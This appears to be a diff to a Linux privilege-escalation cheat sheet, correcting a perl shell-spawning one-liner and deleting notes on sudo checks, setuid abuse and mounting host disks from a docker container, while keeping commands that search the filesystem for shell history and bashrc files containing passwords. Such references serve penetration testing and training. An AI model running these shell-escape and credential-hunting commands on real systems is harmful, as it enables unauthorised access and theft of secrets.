@@ -25,7 +25,7 @@
 === "perl"
 
 	``` bash
-	perl —e 'exec "/bin/sh";'
+	perl -e 'exec "/bin/sh";'
 	```
 
 	``` bash
@@ -303,54 +303,11 @@ lse.sh
 
 ## More Reference
 
-### Check sudo access 
-
-``` bash
-$ sudo -l
-[sudo] password for Hades: 
-Matching Defaults entries for pentesterlab on 7358cafc3ebe:
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-User Hades may run the following commands:
-    (victim) /bin/bash
-```
-
-Mix cp/chown and chmod
-
-https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial/
-
-https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
-
-``` bash
-sudo -l
-Matching Defaults entries for Hades:
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-User Hades may run the following commands:
-    (victim) /bin/chmod, /bin/cp
-```
-
 ### Check history, bashrc, backup
 
 ``` bash
 find / -name *history* 2>/dev/null
 find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
-```
-
-### Checking docker container
-
-``` bash
-root@315d7648a173:/# ls -lah
-<snip>
--rwxr-xr-x   1 root root    0 Jun  9 13:01 .dockerenv
-```
-
-``` bash
-mkdir -p /mnt/hola
-```
-
-``` bash
-mount /dev/sda1 /mnt/hola
-mount /dev/sda2 /mnt/hola
-mount /dev/sda3 /mnt/hola
 ```
 
 ### <a href='https://www.ssh.com/ssh/tunneling/example' target="blank">Port Tunneling</a>
